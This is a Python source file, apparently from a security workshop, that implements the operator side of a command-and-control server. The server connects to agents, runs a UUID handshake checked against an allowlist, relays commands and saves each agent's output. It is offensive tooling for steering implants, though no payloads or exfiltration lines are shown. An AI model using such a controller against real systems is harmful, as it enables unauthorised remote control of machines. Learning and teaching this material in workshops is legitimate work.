import os
import yaml
from workshop.protocol import validator
from workshop.protocol.c2_protocol import *
import c2_commands



agents_output_dir = "agents_output"
server_config = yaml.safe_load(open("c2_config.yml"))
allowed_agent_uuid_list = server_config["allowed_agent_uuid_list"]


class C2:
    def __init__(self, dst_ip, dst_port):
        print(f"[+] Validating address {dst_ip}:{dst_port}")
        validator.validate_ip(dst_ip)
        validator.validate_port(dst_port)
        self.c2_protocol = C2Protocol(dst_ip, dst_port)
        self.agent_output_dir = None
        self.reconnect_wait_period = 10
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 3

    def handle_reconnect(self):
        self.reconnect_attempts += 1
        if self.reconnect_attempts > self.max_reconnect_attempts:
            print("[-] Max reconnect attempts reached. Exiting...")
            exit(-1)

        time.sleep(self.reconnect_wait_period)
        self.connect()

    def send_and_wait_for_response(self, command_id, command_arguments):
        self.c2_protocol.send_command(command_id, command_arguments)
        command_status, command_response = self.c2_protocol.receive_command()
        c2_commands.handle_command_response(command_id, command_status, command_response)


    def handle_command_from_ui(self, command_id):
        command_arguments = c2_commands.handle_command_request(command_id)
        try:
            self.send_and_wait_for_response(command_id, command_arguments)
        except (BrokenPipeError, ConnectionResetError, socket.error) as e:
            print(f"[-] Disconnected with error: {e}\nWill try to reconnect in {self.reconnect_wait_period} seconds...")
            self.handle_reconnect()
        except Exception as e:
            print(f"[-] Error while sending/receiving command from/to agent:\n\t{e}")

    def create_agent_data_dirs(self, agent_uuid):
        # create dir for agent output
        self.agent_output_dir = os.path.join(agents_output_dir, agent_uuid)
        os.makedirs(self.agent_output_dir, exist_ok=True)

    def connect(self):
        self.c2_protocol.connect_to_agent()
        self.c2_hello()

    def c2_hello(self):
        print(f"[+] Trying to receive agent's hello")
        agent_uuid = self.c2_protocol.c2_hello_receive()
        if not agent_uuid:
            raise Exception("[-] C2 hello failed")

        print(f"[+] Received agent UUID: {agent_uuid}")
        # todo: check if agent uuid is allowed agent to communicate with this C2. if not return status error and refuse to handle further requests from this agent uuid
        # optional
        if agent_uuid not in allowed_agent_uuid_list:
            self.c2_protocol.c2_hello_send(agent_uuid, status=MESSAGE_STATUS_ERROR)
            raise Exception(f"[-] {agent_uuid} is not in the allowed UUID list in the c2_config.yml file")

        self.create_agent_data_dirs(agent_uuid)
        self.c2_protocol.c2_hello_send(agent_uuid, status=MESSAGE_STATUS_OK)
        print(f"[+] Waiting for command to send")




if __name__ == '__main__':
    # c2 = C2("127.0.0.1", 9900)
    # c2.connect()
    print()


